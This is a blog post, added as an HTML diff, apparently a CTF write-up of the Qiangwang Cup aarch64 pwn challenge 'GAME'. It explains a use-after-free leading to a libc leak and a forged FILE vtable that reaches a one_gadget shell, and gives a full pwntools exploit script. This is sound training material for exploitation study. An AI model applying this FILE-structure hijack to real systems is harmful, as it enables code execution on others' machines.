@@ -1,0 +1,692 @@
+<!doctype html>
+
+
+
+  
+
+
+
+    
+  
+
+<html class="theme-next logos use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="在强网杯这种省级比赛遇到了这样的题目，就有种小学期末考试碰到了微积分题目的感觉。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第二届强网杯Pwn-GAME">
+<meta property="og:url" content="http://matshao.com/2017/10/04/第二届强网杯Pwn-GAME/index.html">
+<meta property="og:site_name" content="Mid Station">
+<meta property="og:description" content="在强网杯这种省级比赛遇到了这样的题目，就有种小学期末考试碰到了微积分题目的感觉。">
+<meta property="og:image" content="http://matshao.qiniudn.com/qwb1.png">
+<meta property="og:image" content="http://matshao.qiniudn.com/qwb2.png">
+<meta property="og:image" content="http://matshao.qiniudn.com/qwb3.png">
+<meta property="og:image" content="http://matshao.qiniudn.com/qwb4.png">
+<meta property="og:image" content="http://matshao.qiniudn.com/qwb5.png">
+<meta property="og:image" content="http://matshao.qiniudn.com/qwb6.png">
+<meta property="og:updated_time" content="2017-10-04T08:42:01.310Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第二届强网杯Pwn-GAME">
+<meta name="twitter:description" content="在强网杯这种省级比赛遇到了这样的题目，就有种小学期末考试碰到了微积分题目的感觉。">
+<meta name="twitter:image" content="http://matshao.qiniudn.com/qwb1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Logos',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://matshao.com/2017/10/04/第二届强网杯Pwn-GAME/"/>
+
+
+
+
+
+  <title> 第二届强网杯Pwn-GAME | Mid Station </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="header-logos"> 
+      <div class="site-meta ">
+  
+    <div class="site-meta-headline">
+      <a href="/">
+        <img class="custom-logo-image" src="/images/logo_light.png"
+             alt="Mid Station"/>
+      </a>
+    </div>
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Mid Station</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <p class="site-subtitle"></p>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            關於
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ 
+            
+      </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://matshao.com/2017/10/04/第二届强网杯Pwn-GAME/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="Matthew Shao">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Mid Station">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Mid Station" src="/images/logo_light.png">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                第二届强网杯Pwn-GAME
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-04T16:31:58+08:00">
+                2017-10-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>在强网杯这种省级比赛遇到了这样的题目，就有种小学期末考试碰到了微积分题目的感觉。<br><a id="more"></a></p>
+</blockquote>
+<h2 id="QEMU-aarch64"><a href="#QEMU-aarch64" class="headerlink" title="QEMU aarch64"></a>QEMU aarch64</h2><p><a href="http://matshao.qiniudn.com/GAME_d3c4b09f9c2341cfa95e3aad9c22ec21.zip" target="_blank" rel="external">Download here</a><br>第一个难点就是把程序跑起来，这是一个armv8的程序，比赛时候想了很多方法。包括想到用树莓派甚至是iPhone来跑这个程序来调试，这些想法都不现实，后来还是老老实实搭建QEMU，期间找到了一个开箱即用的Ubuntu虚拟机：<a href="https://blahcat.github.io/2017/06/25/qemu-images-to-play-with/" target="_blank" rel="external">Some Qemu images to play with
+</a>,跑起来又觉得太卡，输入命令行等回显都要两三秒，更不用说用gdb来调试了。</p>
+<p>这两天有时间又重新找了一下aarch64 QEMU虚拟机的搭建方法，然后按照<a href="https://zhiwei.li/text/2015/07/11/%E7%94%A8qemu%E8%BF%90%E8%A1%8Carm64%E7%89%88%E6%9C%AC%E7%9A%84debian8/" target="_blank" rel="external">用QEMU运行ARM64版本的Debian8</a>这里的方法搭建了一台Debian系统的。讲道理Ubuntu系统当然是首选，但是可能是网络的原因，载入网络镜像之后虚拟机就启动不了，Debian用起来也没有区别。</p>
+<p>参照链接里面的命令把虚拟机的端口转发出来，我除了转发22端口，来多转了一个4444端口，用于连接程序。然后把gdb，pwntools，gef等一系列必备工具装上。（这又是一个痛苦的等待过程，QEMU跑起来真的很慢）</p>
+<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p>另外一个令人头大的地方就是如何才能看懂程序的逻辑。这是ARMv8的程序，用的是和x86完全不同的指令集。比赛进行过程中手头上只有6.8版本的IDA，没有办法反编译ARM64的程序，指令集又不熟悉的情况下可谓是雾里看花。后来才在机缘巧合之下陆续搞到了6.9和7.0版本的IDA，终于可以反编译分析程序。</p>
+<h2 id="Vulns"><a href="#Vulns" class="headerlink" title="Vulns"></a>Vulns</h2><h3 id="UAF-0x1"><a href="#UAF-0x1" class="headerlink" title="UAF 0x1"></a>UAF 0x1</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div></pre></td><td class="code"><pre><div class="line">root@debian:~<span class="comment"># ./game </span></div><div class="line">Hello everyone,welcome to The Legend of Sword and Fairy nonick version</div><div class="line">First,choose your preferred hero:</div><div class="line">1.Li Xiao Yao</div><div class="line">2.Zhao Ling Er</div><div class="line">3.L<span class="keyword">in</span> Yue Ru</div><div class="line">99.exit</div><div class="line">^C</div><div class="line">root@debian:~<span class="comment"># clear</span></div><div class="line"></div><div class="line">root@debian:~<span class="comment"># ./game </span></div><div class="line">Hello everyone,welcome to The Legend of Sword and Fairy nonick version</div><div class="line">First,choose your preferred hero:</div><div class="line">1.Li Xiao Yao</div><div class="line">2.Zhao Ling Er</div><div class="line">3.L<span class="keyword">in</span> Yue Ru</div><div class="line">99.exit</div><div class="line">2</div><div class="line">Here is your hero!</div><div class="line">Hero Zhao ling Er status</div><div class="line">-----------------</div><div class="line">Slogan:I am curious about who is our enemy?</div><div class="line">Health:80</div><div class="line">Mana:40</div><div class="line">Attack:20</div><div class="line">Defense:15</div><div class="line">Speed:50</div><div class="line">Critical attack rate:0.3</div><div class="line">Coins:0</div><div class="line">-----------------</div><div class="line">Spells:</div><div class="line">* Simple attack</div><div class="line">	Decrease target Health 10 points.</div><div class="line">	This spell takes you 3 Mana points.</div><div class="line">-----------------</div><div class="line">* Normal attack</div><div class="line">	Decrease target Health 20 points.</div><div class="line">	Decrease target Attack 20 points.</div><div class="line">	This spell takes you 10 Mana points.</div><div class="line">-----------------</div><div class="line">* Death<span class="string">'s glare</span></div><div class="line">	Decrease target Health 50 points.</div><div class="line">	Decrease target Defense 20 points.</div><div class="line">	This spell takes you 20 Mana points.</div><div class="line">-----------------</div><div class="line">You found 126 coins in underbrush!</div><div class="line">Here you have some choices:</div><div class="line">1.Buy something</div><div class="line">2.Start journey</div><div class="line">3.Your status</div><div class="line">4.Kill yourself</div><div class="line">5.Save</div><div class="line">99.exit</div><div class="line">2</div><div class="line">You are out of viliege now.</div><div class="line">Good luck Zhao ling Er!</div><div class="line">Your record:</div><div class="line">	* win:0 times</div><div class="line">	* lost:0 times</div><div class="line">	* escape:0 times</div><div class="line">Your escape ratio will decrease if you use it frequently.</div><div class="line">Here comes a neuts!</div><div class="line">Your turn!</div><div class="line">What do you wanna do?</div><div class="line">1.attack back</div><div class="line">2.use a spell</div><div class="line">3.status</div><div class="line">4.defense</div><div class="line">5.escape</div><div class="line">2</div><div class="line">Which spells do you wanna use?</div><div class="line">1.Simple attack</div><div class="line">2.Normal attack</div><div class="line">3.Death's glare</div><div class="line">1</div><div class="line">Who is your target?</div><div class="line">1.yourself</div><div class="line">2.neuts</div><div class="line">1</div><div class="line">Zhao ling Er is using spell Simple attack on Zhao ling Er!</div><div class="line">neuts is using spell hammer hit on Zhao ling Er!</div><div class="line">Your turn!</div><div class="line">What <span class="keyword">do</span> you wanna <span class="keyword">do</span>?</div><div class="line">1.attack back</div><div class="line">2.use a spell</div><div class="line">3.status</div><div class="line">4.defense</div><div class="line">5.escape</div><div class="line">2</div><div class="line">Which spells <span class="keyword">do</span> you wanna use?</div><div class="line">1.Simple attack</div><div class="line">2.Normal attack</div><div class="line">3.Death<span class="string">'s glare</span></div><div class="line">1</div><div class="line">Who is your target?</div><div class="line">1.yourself</div><div class="line">2.neuts</div><div class="line">1</div><div class="line">Zhao ling Er is using spell Simple attack on Zhao ling Er!</div><div class="line">Your turn!</div><div class="line">What do you wanna do?</div><div class="line">1.attack back</div><div class="line">2.use a spell</div><div class="line">3.status</div><div class="line">4.defense</div><div class="line">5.escape</div><div class="line">2</div><div class="line">Which spells do you wanna use?</div><div class="line">1.Simple attack</div><div class="line">2.Normal attack</div><div class="line">3.Death's glare</div><div class="line">1</div><div class="line">Who is your target?</div><div class="line">1.yourself</div><div class="line">2.neuts</div><div class="line">1</div><div class="line">Zhao ling Er is using spell Simple attack on Zhao ling Er!</div><div class="line">neuts is attacking Zhao ling Er!</div><div class="line">This is a CRITICAL attack!</div><div class="line">This attack takes 20 Health points!</div><div class="line">Zhao ling Er is killed by neuts!!</div><div class="line">neuts get 126 coins!</div><div class="line">Hero Zhao ling Er is DEAD!</div><div class="line">YOU ARE DEAD!!</div><div class="line">Thanks <span class="keyword">for</span> your playing!</div><div class="line">Do you have anything to report to us? (bug,unreasonable <span class="keyword">in</span> character design,or anything <span class="keyword">else</span>)</div><div class="line">aaaa</div><div class="line">We will consider each feedback seriously!Good <span class="built_in">bye</span>!</div></pre></td></tr></table></figure>
+<p>首先贴上一段程序的运行流程， 可以看到这是一个RPG游戏程序（仙剑奇侠传？）,主菜单有几个选项，包括买东西，出城打野，自杀，保存等。也许是自己功力不够，就算反编译了程序也看不出漏洞在哪里，跟着官方的writeup才勉强看出了端倪。<br><img src="http://matshao.qiniudn.com/qwb1.png" alt="Alt text"><br>上面是main函数里面判断角色死亡的条件，用的是<code>role-&gt;blood &amp; 0x8000000000000000</code>,也就是判断blood的最高位是否为1，等同于判断blood是否为负数。<br><img src="http://matshao.qiniudn.com/qwb2.png" alt="Alt text"><br>而在journey函数里面，判断角色存活的条件是<code>role-&gt;blood &gt; 0</code>，如果发现角色已经死亡（血量&lt;=0），那么就会在这个函数里面调用角色结构体里面的虚表把对象给free掉。</p>
+<p>两个判断条件的不一致就导致了一个Use-After-Free漏洞。当角色在journey函数里面血量等于0死亡，程序并不会立即结束，而是返回到main函数，留给我们继续操作的余地。<br><img src="http://matshao.qiniudn.com/qwb3.png" alt="Alt text"><br>然后选择save的选项，fopen将在heap中保存file object，而地址就正好是原先role对象所在的地址。而<code>role-&gt;coins</code>所在的地址正好就是现在<code>file-&gt;_IO_file_jumps</code>的地址，通过shop函数就能把<code>file-&gt;_IO_file_jumps</code>的内容给泄露出来，然后就得到了一个libc的地址，可以用于计算偏移地址。</p>
+<h3 id="UAF-0x2"><a href="#UAF-0x2" class="headerlink" title="UAF 0x2"></a>UAF 0x2</h3><p>得到libc地址以后，在主菜单选择kill yourself来free掉file object，然后选择退出程序，进入了comment函数。<br><img src="http://matshao.qiniudn.com/qwb4.png" alt="Alt text"><br>comment函数这里在heap上申请了0x200 bytes空间，正好又落在了之前file object所在的位置，到这里我们已经通过输入评论的内容可以任意控制file object里面的结构。</p>
+<p>因为之前并没有对file object进行close操作，在最后调用exit()的时候会调用<code>_IO_Cleanup</code>来处理file object，最终在<code>_IO_flush_all_lockp</code>会调用被修改的file objec里面的vtable。这里的利用逻辑和<a href="http://4ngelboy.blogspot.jp/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="external">house of orange</a>很类似，都是伪造file object来达到控制IP的目的。</p>
+<p>然而据writeup里面所说，这里的libc版本是2.24，引入了vtable check，所以file object的vtable地址并不能随便填。<br><img src="http://matshao.qiniudn.com/qwb5.png" alt="Alt text"><br><img src="http://matshao.qiniudn.com/qwb6.png" alt="Alt text"><br>如果把vtable地址改到<code>0x13f050</code>的位置，那么<code>_IO_OVERFLOW</code>就会落在<code>0x13f060-&gt;0x650b0</code>的位置，而我们可以看到只要在fp+232的位置填上我们想要跳转的位置，就能控制IP，这里直接就填上libc里面找到的one_gadget就能get shell。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment"># context.log_level = 'debug'</span></div><div class="line">context.arch = <span class="string">'aarch64'</span></div><div class="line">p = remote(<span class="string">'localhost'</span>, <span class="number">4444</span>)</div><div class="line">env = &#123;<span class="string">'LD_PRELOAD'</span>: <span class="string">'./libc.so.6'</span>&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_role</span><span class="params">(index)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'exit\n'</span>)</div><div class="line">    p.sendline(str(index))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_menu</span><span class="params">(choice)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'exit\n'</span>)</div><div class="line">    p.sendline(str(choice))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack_self</span><span class="params">()</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'escape\n'</span>)</div><div class="line">    p.sendline(<span class="string">'2'</span>) <span class="comment"># use spell</span></div><div class="line">    p.recvuntil(<span class="string">'glare\n'</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>) <span class="comment"># simple attack</span></div><div class="line">    p.recvlines(<span class="number">3</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>) <span class="comment"># attack self</span></div><div class="line">    content = p.recvlines(<span class="number">6</span>)</div><div class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(content) </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></div><div class="line">    main_menu(<span class="number">5</span>) <span class="comment"># save</span></div><div class="line">    main_menu(<span class="number">1</span>) <span class="comment"># shop</span></div><div class="line">    p.recvuntil(<span class="string">'coins:'</span>)</div><div class="line">    addr = int(p.recvline()[:<span class="number">-1</span>])</div><div class="line">    p.info(<span class="string">'libc_leak: %x'</span> % addr)</div><div class="line">    p.recvuntil(<span class="string">'shop\n'</span>)</div><div class="line">    p.sendline(<span class="string">'99'</span>)</div><div class="line">    <span class="keyword">return</span> addr </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">(comment)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'else)\n'</span>)</div><div class="line">    p.sendline(comment)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill_self</span><span class="params">()</span>:</span></div><div class="line">    main_menu(<span class="number">4</span>)</div><div class="line">    p.recvuntil(<span class="string">'no)\n'</span>)</div><div class="line">    p.sendline(<span class="string">'yes'</span>)</div><div class="line"></div><div class="line">select_role(<span class="number">2</span>)</div><div class="line">main_menu(<span class="number">2</span>) <span class="comment"># journey</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    recv = attack_self()</div><div class="line">    <span class="keyword">print</span> recv</div><div class="line">    <span class="keyword">if</span> <span class="string">'DEAD'</span> <span class="keyword">in</span> recv <span class="keyword">and</span> <span class="string">'choices'</span> <span class="keyword">in</span> recv:</div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">elif</span> <span class="string">'Thanks'</span> <span class="keyword">in</span> recv:</div><div class="line">        p.failure(<span class="string">'Bad try!'</span>)</div><div class="line">        <span class="keyword">break</span></div><div class="line">libc_addr = leak_libc()</div><div class="line">libc_start = libc_addr - <span class="number">0x13f638</span></div><div class="line">one_gadget = libc_start + <span class="number">0x3ca9c</span></div><div class="line">p.info(<span class="string">'libc_start: %x'</span> % libc_start)</div><div class="line">p.info(<span class="string">'one_gadget: %x'</span> % one_gadget)</div><div class="line">p.info(<span class="string">'vtable_to_jump: 0x%x'</span> % (libc_start+<span class="number">0x6050b0</span>))</div><div class="line">kill_self()</div><div class="line">vtable_ptr = libc_start + <span class="number">0x13f050</span></div><div class="line">p.info(<span class="string">'vtable: 0x%x'</span> % vtable_ptr)</div><div class="line">content = [<span class="number">0</span>] * <span class="number">27</span> </div><div class="line">content[<span class="number">1</span>] = <span class="number">0x61</span></div><div class="line">content[<span class="number">24</span>] = <span class="number">1</span></div><div class="line">content[<span class="number">21</span>] = <span class="number">2</span></div><div class="line">content[<span class="number">22</span>] = <span class="number">3</span></div><div class="line">content[<span class="number">20</span>] = vtable_ptr </div><div class="line">fake_file =  flat(content) + p64(vtable_ptr<span class="number">-8</span>) + p64(<span class="number">0</span>) + p64(one_gadget)</div><div class="line">pause()</div><div class="line">exit(fake_file)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>因为遇到的野怪和它的出招的是随机的，没有办法保证每一次游戏角色都0血死亡，这里只能让角色不停攻击自己，每次消耗10点血，争取0血死亡。如果没法0血死亡进入预定的程序轨道，EXP就会报错bad try。这里的重点在于如何构造一个fake file object 去满足<code>_IO_flush_all_lockp</code>里面的条件来劫持IP。</p>
+<h2 id="Recap"><a href="#Recap" class="headerlink" title="Recap"></a>Recap</h2><ol>
+<li>aarch 64 QEMU搭建和联动调试</li>
+<li>ARM指令集的简要用法</li>
+<li>通过文件对象的UAF来劫持IP</li>
+<li>以前老是不明白为什么<code>fopen</code>打开文件以后还要<code>close</code>，现在懂了。</li>
+</ol>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/12/Summer-of-Code-17/" rel="next" title="Summer of Code 17">
+                <i class="fa fa-chevron-left"></i> Summer of Code 17
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Matthew Shao" />
+          <p class="site-author-name" itemprop="name">Matthew Shao</p>
+          <p class="site-description motion-element" itemprop="description">太初有道，曰逻各斯</p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-name">文章</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分類</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">標籤</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/MatthewShao" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#QEMU-aarch64"><span class="nav-number">1.</span> <span class="nav-text">QEMU aarch64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IDA"><span class="nav-number">2.</span> <span class="nav-text">IDA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vulns"><span class="nav-number">3.</span> <span class="nav-text">Vulns</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UAF-0x1"><span class="nav-number">3.1.</span> <span class="nav-text">UAF 0x1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UAF-0x2"><span class="nav-number">3.2.</span> <span class="nav-text">UAF 0x2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">4.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recap"><span class="nav-number">5.</span> <span class="nav-text">Recap</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Matthew Shao</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Logos
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
